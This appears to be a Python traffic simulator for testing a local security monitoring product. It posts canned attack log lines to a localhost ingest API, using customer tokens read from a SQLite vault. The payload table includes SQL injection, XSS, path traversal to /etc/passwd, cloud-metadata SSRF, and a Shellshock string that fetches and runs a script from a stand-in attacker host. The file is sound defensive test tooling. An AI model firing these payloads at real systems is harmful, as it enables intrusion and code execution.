# simulate_traffic.py
import sqlite3
import os
import requests
import random
import time

API_URL = "http://localhost:8000/api/v1/ingest"
DB_PATH = "security_vault.db"  # Conexión directa al vault local de tu Mac

# 💥 VECTORES DE ATAQUE COMPLETOS PARA LA SIMULACIÓN
PAYLOADS_ATAQUE = {
    "1": {
        "tipo": "Brute Force Attack",
        "log": "2026-06-19 04:21:00 - user=admin - STATUS: FAILED LOGIN - Attempt"
    },
    "2": {
        "tipo": "SQL Injection (SQLi)",
        "log": "GET /api/v1/products?id=1' UNION SELECT username, password FROM sakti_users-- HTTP/1.1"
    },
    "3": {
        "tipo": "Cross-Site Scripting (XSS)",
        "log": "POST /comments HTTP/1.1 - body=<script>alert('XSS_SaktiShield_Test')</script>"
    },
    "4": {
        "tipo": "Directory Traversal",
        "log": "GET /static/../../../../etc/passwd HTTP/1.1 - Host: security-target.com"
    },
    "5": {
        "tipo": "Remote Code Execution (RCE) - Shellshock",
        "log": "GET /cgi-bin/stats.cgi HTTP/1.1 - Host: vulnerable.com - User-Agent: () { :;}; /bin/bash -c 'whoami; id; wget http://atacker.com/malware.sh | sh'"
    },
    "6": {
        "tipo": "SSRF Attack",
        "log": "GET /fetch?url=http://169.254.169.254/latest/meta-data/local-ipv4 HTTP/1.1"
    },
    "7": {
        "tipo": "DDoS Attack (Saturación de Botnet)", 
        "log": "GET /index.html HTTP/1.1 - Inundación de tráfico volumétrico distribuído"
    },
    "8": {
        "tipo": "Tráfico Legítimo (Rutinario)",
        "log": "GET /index.html HTTP/1.1 - Host: website.com - Status 200 OK - User-Agent: Mozilla/5.0"
    }
}

def obtener_clientes_desde_vault():
    if not os.path.exists(DB_PATH):
        print(f"❌ Error: No se detecta el archivo '{DB_PATH}' en este directorio.")
        return {}
        
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    clientes_dict = {}
    
    try:
        cursor.execute("SELECT id, empresa_name, api_key FROM sakti_customers WHERE estatus = 'ACTIVO';")
        rows = cursor.fetchall()
        for index, row in enumerate(rows, start=1):
            clientes_dict[str(index)] = {
                "id_db": row[0],
                "nombre": row[1],
                "token": row[2]
            }
    except Exception as e:
        print(f"❌ Error al consultar el Vault SQLite: {e}")
    finally:
        conn.close()
    return clientes_dict

def enviar_trafico(token_cliente, nombre_cliente, payload_log, tipo_ataque, ip_fija=None):
    headers = {
        "X-Sakti-Token": token_cliente,
        "Content-Type": "application/json"
    }
    
    # Si pasamos una IP fija (Fuerza Bruta), la mantiene. Si no, genera una aleatoria (Web Exploits / DDoS).
    ip_final = ip_fija if ip_fija else f"{random.randint(50,220)}.{random.randint(10,250)}.{random.randint(1,254)}.{random.randint(1,254)}"
    
    data = {
        "client_ip": ip_final,
        "log_entry": payload_log
    }
    
    print(f"📡 [DISPARANDO] {tipo_ataque} desde IP: {ip_final} contra {nombre_cliente}...")
    try:
        response = requests.post(API_URL, json=data, headers=headers)
        if response.status_code == 200:
            res_json = response.json()
            print(f"✅ API RESPUESTA (200 OK):")
            print(f"   • Core Decision: {res_json.get('decision_core', 'N/A')}")
            print(f"   • Mensaje: {res_json.get('message')}")
            return res_json.get('decision_core', 'N/A')
        else:
            print(f"❌ Error en la API Ingest ({response.status_code}): {response.text}")
    except Exception as e:
        print(f"❌ Error de conexión de red con el backend: {e}")
    return "ERROR"

def menu():
    while True:
        clientes_vigentes = obtener_clientes_desde_vault()
        
        print("\n" + "="*60)
        print("🛡️  SAKTISHIELD — SIMULADOR COMPLETO DE CIBERAMENAZAS 🛡️")
        print("="*60)
        print("Selecciona el Cliente Objetivo (Leyendo Vault en Vivo):")
        
        if not clientes_vigentes:
            print("⚠️  No hay clientes activos registrados en security_vault.db")
            print(" [4] Salir")
        else:
            for opcion, datos in clientes_vigentes.items():
                print(f" [{opcion}] {datos['nombre']}")
            opcion_salir = str(len(clientes_vigentes) + 1)
            print(f" [{opcion_salir}] Salir")
        
        opcion_cliente = input("\n👉 Elige una opción: ").strip()
        
        if not clientes_vigentes and opcion_cliente == "4":
            break
        elif clientes_vigentes and opcion_cliente == opcion_salir:
            print("👋 Cerrando el simulador de tráfico.")
            break
            
        if opcion_cliente not in clientes_vigentes:
            print("❌ Opción inválida. Intenta de nuevo.")
            continue
            
        cliente_elegido = clientes_vigentes[opcion_cliente]
        
        print("\nSelecciona el Vector de Ataque a simular:")
        for k, v in PAYLOADS_ATAQUE.items():
            print(f" [{k}] {v['tipo']}")
            
        opcion_payload = input("\n👉 Elige el vector (1-8): ").strip()
        if opcion_payload not in PAYLOADS_ATAQUE:
            print("❌ Vector inválido. Operación cancelada.")
            continue
            
        payload_elegido = PAYLOADS_ATAQUE[opcion_payload]
        
        # ====================================================================
        # 🎯 BLOQUE LOGÍSTICO DE DISPARO SEGÚN EL VECTOR SELECCIONADO
        # ====================================================================
        if opcion_payload == "1":
            print("\n🚀 [RÁFAGA] Iniciando simulación de ataque de Fuerza Bruta distribuido temporalmente...")
            ip_ataque_bruto = f"{random.randint(50,220)}.{random.randint(10,250)}.{random.randint(1,254)}.{random.randint(1,254)}"
            
            # Lanzamos 4 intentos seguidos con la misma IP para obligar a saltar el umbral
            for intento in range(1, 5):
                print(f"\n[Intento {intento}/4]")
                log_con_intento = f"{payload_elegido['log']} {intento}/4"
                decision = enviar_trafico(
                    token_cliente=cliente_elegido["token"],
                    nombre_cliente=cliente_elegido["nombre"],
                    payload_log=log_con_intento,
                    tipo_ataque=payload_elegido["tipo"],
                    ip_fija=ip_ataque_bruto
                )
                if "BLOQUEADO" in decision:
                    print(f"💥 [ÉXITO SOAR]: El orquestador ha bloqueado la IP {ip_ataque_bruto} en el intento {intento}.")
                    break
                time.sleep(1) # Pequeña pausa de red entre ráfagas

        elif opcion_payload == "7":
            print(f"\n⚡ [BOTNET ACTIVADA]: Lanzando ráfaga volumétrica DDoS contra {cliente_elegido['nombre']}...")
            # Simulamos 15 peticiones ultra rápidas viniendo de IPs totalmente diferentes para emular una botnet distribuida
            for i in range(1, 16):
                ip_bot = f"{random.randint(50,220)}.{random.randint(10,250)}.{random.randint(1,254)}.{random.randint(1,254)}"
                log_ddos = f"{payload_elegido['log']} - Bot #{i}"
                
                decision = enviar_trafico(
                    token_cliente=cliente_elegido["token"],
                    nombre_cliente=cliente_elegido["nombre"],
                    payload_log=log_ddos,
                    tipo_ataque=payload_elegido["tipo"],
                    ip_fija=ip_bot
                )
                # Ejecución en ráfaga continua (sin time.sleep) para saturar el control de 2 segundos del backend
                
            print("\n💥 [FIN DE LA RÁFAGA]: Revisa tu Dashboard y tu Telegram para verificar la mitigación.")

        else:
            # Flujo estándar para vectores web unitarios (SQLi, XSS, SSRF, RCE, Legítimo...)
            enviar_trafico(
                token_cliente=cliente_elegido["token"],
                nombre_cliente=cliente_elegido["nombre"],
                payload_log=payload_elegido["log"],
                tipo_ataque=payload_elegido["tipo"]
            )
        print("="*60)

if __name__ == "__main__":
    menu()